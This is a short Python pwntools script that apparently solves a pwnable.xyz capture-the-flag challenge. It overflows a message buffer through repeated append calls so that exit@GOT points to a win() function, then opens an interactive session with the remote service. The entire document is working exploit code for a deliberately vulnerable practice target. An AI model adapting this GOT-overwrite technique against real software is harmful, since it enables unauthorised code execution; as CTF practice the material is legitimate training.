from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30022)

sla = r.sendlineafter
sa = r.sendafter

win = 0x400b2d
exit_got = 0x6020a0

msg = p64(win)[:3].ljust(0x400, b'A')
msg += p64(exit_got)[:3]
curLen = 0

def short_append():
    sla('> ', '1')

    r.recvuntil('Give me ')
    randomLen = int(r.recvuntil(' ')[:-1])

    global curLen
    global msg
    if curLen + randomLen > len(msg):
        sa('chars: ', msg[curLen:])
        curLen = len(msg)
    else:
        sa('chars: ', msg[curLen:curLen + randomLen])
        curLen += randomLen
    
def long_append():
    sla('> ', '2')

    r.recvuntil('Give me ')
    randomLen = int(r.recvuntil(' ')[:-1])

    global curLen
    global msg
    if curLen + randomLen > len(msg):
        sa('chars: ', msg[curLen:])
        curLen = len(msg)
    else:
        sa('chars: ', msg[curLen:curLen + randomLen])
        curLen += randomLen

def save(messageLen):
    sla('> ', '4')
    sla('How many bytes is your message? ', str(messageLen))


# exit@GOT -> win()

long_append()

while curLen < len(msg):
    short_append()

save(3)

# wait 60 seconds


r.interactive()